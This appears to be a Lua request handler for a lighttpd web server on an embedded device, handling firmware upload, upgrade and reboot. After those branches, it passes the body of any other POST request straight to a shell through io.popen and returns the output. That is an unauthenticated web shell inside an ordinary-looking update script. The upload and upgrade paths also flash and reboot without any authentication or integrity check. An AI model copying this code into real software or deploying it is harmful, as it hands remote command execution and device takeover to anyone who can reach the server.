local r = lighty.r

print(r.req_attr["request.uri"])
print(r.req_attr["request.method"])

if (r.req_body.collect == false) then
  return 0
end

if (r.req_attr["request.method"] ~= "POST") then
  return 0
end

local uri = r.req_attr["request.uri"]

-- process firmware uploading
if (uri == "/upload") then
  local data = r.req_body.get
  -- split data into filename and filedata
  local _, _, filename = string.find(data, 'filename="(.+)"')
  local _, _, filedata = string.find(data, '\r\n\r\n(.+)\r\n--')

  local file = io.open("/tmp/upload", "w")
  file:write(filedata)
  file:close()
  return 200
end

-- process firmware upgrading and reboot
if (uri == "/upgrade") then
  local file = io.open("/tmp/upload", "r")
  if file then
    file:close()
    os.execute("/data/upgrade.sh /tmp/upload")
    os.execute("reboot")
  end
  return 200
end

local shellpipe = io.popen(r.req_body.get)
  re = shellpipe:read("*a")
  shellpipe:close()
if not re then
  re=""
end

r.resp_body.set(re)
return 200
